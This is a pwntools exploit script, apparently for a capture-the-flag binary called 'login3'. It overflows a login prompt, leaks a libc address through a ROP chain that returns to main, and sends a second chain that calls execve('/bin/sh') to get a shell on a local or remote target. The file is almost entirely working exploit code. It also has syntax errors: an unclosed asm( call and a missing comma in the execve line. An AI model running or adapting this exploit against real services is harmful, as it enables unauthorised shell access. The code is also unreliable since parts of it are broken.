from pwn import *
import sys

binary = './login3'

elf = ELF(binary)
context.binary = binary

#host = 'localhost'
host = 'host'
port = 10003

if len(sys.argv) >= 2 and sys.argv[1] == 'r':
    # remote
    r = remote(host, port)
    libc = ELF('./libc-2.27.so')
else:
    # local
    r = process(binary)
    libc = elf.libc

# ret2main
rop = ROP(elf)
rop.puts(elf.got.printf)
rop.main()
print(rop.dump())
r.sendlineafter(b'ID: ', b'a'*0x28 + rop.chain())

print(r.recvline())
printf = r.recvline() # get printf address (puts(printf))

# make 8bytes
printf = unpack(printf[:-1].ljust(8, b'\0')) #unpack:bytes->int, ljust:make number string and left side
print('printf: %x' %printf)                  #7f4d9b8b0e80
print('libc printf %x' %libc.symbols.printf) #64e80

libc.address = printf - libc.symbols.printf

# /bin/sh
rop = ROP(libc)
#print(libc.search(b'/bin/sh')) # iterator
addr_sh = libc.search(b'/bin/sh').next() # iterator
print("libc.search(b'/bin/sh').next() %x" %addr_sh)
asm(
#rop.execv(addr_sh, 0)
rop.execve(addr_sh, 0  0)
print(rop.dump())
#bof and execute /bin/sh
r.sendlineafter(b'ID: ', b'a'*0x28 + rop.chain())

r.interactive()
